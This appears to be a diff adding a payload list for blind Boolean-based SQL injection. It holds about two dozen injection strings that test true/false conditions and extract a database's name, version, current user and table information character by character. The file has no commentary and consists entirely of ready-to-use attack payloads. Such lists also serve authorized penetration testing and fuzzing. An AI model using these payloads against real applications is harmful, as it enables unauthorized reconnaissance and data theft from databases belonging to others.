@@ -1,0 +1,25 @@
+blind Boolean based sql injection :~
+
+' AND 1=1 --
+' AND 1=2 --
+' OR EXISTS(SELECT 1)--
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND ASCII(SUBSTRING(database(),1,1))=115--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT LENGTH(database()))=6--
+' AND LEFT(database(),1)='t'--
+' AND MID(database(),1,1)='s'--
+' AND RIGHT(user(),1)='t'--
+' AND database() LIKE 'test%'--
+' AND user() LIKE 'root%'--
+' AND ORD(MID((SELECT database()),1,1))=115--
+' AND HEX(SUBSTRING(database(),1,1))=0x73--
+' AND BIT_LENGTH(database())=48--
+' AND LENGTH(user())=16--
+' AND CAST(database() AS CHAR) LIKE 'test%'--
+' AND (SELECT COUNT(table_name) FROM information_schema.tables)>1--
+' AND 2>1--
+' AND 2<1--
+' AND 'a'='a'--
+' AND 'a'='b'--
+' OR (SELECT 'a' FROM dual WHERE 'a'='a')='a'--
